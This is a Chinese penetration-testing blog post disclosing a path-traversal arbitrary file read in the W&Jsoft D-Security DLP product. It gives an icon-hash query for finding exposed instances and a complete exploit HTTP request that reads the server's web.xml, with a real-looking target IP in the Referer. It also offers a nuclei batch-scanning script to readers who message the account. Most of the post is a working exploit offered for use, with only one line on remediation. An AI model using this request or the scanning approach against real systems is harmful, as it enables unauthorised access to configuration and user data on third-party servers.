#  W&Jsoft-D-Security数据仿泄露系统(DLP)存在任意文件读取漏洞   
原创 菜鸟学渗透  菜鸟学渗透   2025-01-06 00:30  
  
# 一、漏洞简介  
  
W&Jsoft-D-Security数据防泄露系统(DLP)存在的任意文件读取漏洞，源于对用户输入路径缺乏充分验证，攻击者可通过构造路径穿越字符读取服务器上的任意文件，可能导致敏感信息泄露，如配置文件、用户数据等。建议通过严格的输入验证、权限控制及及时更新补丁来修复漏洞，降低安全风险。  
# 二、影响版  
- W&Jsoft-D-Security  
![](https://mmbiz.qpic.cn/mmbiz_png/hZGcrKavvZlfgEJuJBFozicDdVjWznnGV68KOia7uuK3jyWdllxDThBxT9ZWibut8IqhPjXKdR2EibK3jSicYKygbrg/640?wx_fmt=png&from=appmsg "")  
  
# 三、资产测绘  
```
icon_hash="616947260"
```  
# 四、漏洞复现  
```
GET /DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp?logType=tomcat&logFileName=../../../../../../D-Security/webapps/DLPWebApps/WEB-INF/web.xml HTTP/1.1
Host: *
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://61.221.47.31/index.jsp
Connection: close
Cookie: JSESSIONID=44847BC29677B26A366D3553E29B1C20; JSESSIONID=87868E75291058EC00F04CA08B8749C2
Upgrade-Insecure-Requests: 1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hZGcrKavvZlfgEJuJBFozicDdVjWznnGVgdnXvLBGHoh4oYhGlibXO42sLaliaa0IJHib1h5dBj0InlRicxrCRjVUZQ/640?wx_fmt=png&from=appmsg "")  
  
记得点赞+关注，关注微信公众号  
菜鸟学渗透  
获取最新文章，有任何问题可以后台私信我。  
  
后台回复“   
 nuclei-WJsoft-D-File-Read  
”即可获取nuclei批量扫描脚本  
  
有考取NISP一级/二级/三级、CISP-PTE/PTS等证书的可以加我好友私信我（公众号回复“  
加好友  
”）。  
  
